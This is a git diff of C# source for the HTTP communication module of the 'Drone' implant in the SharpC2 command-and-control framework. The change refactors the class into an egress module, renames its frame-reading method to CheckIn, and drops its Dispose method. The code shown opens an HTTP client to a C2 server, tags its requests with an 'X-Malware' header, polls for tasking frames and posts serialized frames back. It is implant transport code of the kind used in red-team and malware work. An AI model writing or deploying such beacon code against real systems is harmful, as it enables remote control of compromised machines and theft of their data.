@@ -3,15 +3,16 @@ using System.Collections.Generic;
 using System.Net.Http;
 using System.Threading.Tasks;
 
-using Drone.Interfaces;
-
 namespace Drone.CommModules;
 
-public class HttpCommModule : ICommModule
+public class HttpCommModule : EgressCommModule
 {
     private HttpClient _client;
+
+    public override ModuleType Type => ModuleType.EGRESS;
+    public override ModuleMode Mode => ModuleMode.CLIENT;
     
-    public void Init(Metadata metadata)
+    public override void Init(Metadata metadata)
     {
         _client = new HttpClient();
         _client.BaseAddress = new Uri($"{Schema}://{ConnectAddress}:{ConnectPort}");
@@ -22,7 +23,7 @@ public class HttpCommModule : ICommModule
         _client.DefaultRequestHeaders.Add("X-Malware", "SharpC2");
     }
 
-    public async Task<IEnumerable<C2Frame>> ReadFrames()
+    public override async Task<IEnumerable<C2Frame>> CheckIn()
     {
         try
         {
@@ -35,7 +36,7 @@ public class HttpCommModule : ICommModule
         }
     }
 
-    public async Task SendFrame(C2Frame frame)
+    public override async Task SendFrame(C2Frame frame)
     {
         var content = new ByteArrayContent(frame.Serialize());
 
@@ -47,11 +48,6 @@ public class HttpCommModule : ICommModule
         {
             // ignore
         }
-    }
-    
-    public void Dispose()
-    {
-        _client?.Dispose();
     }
 
     private static string Schema => "http";
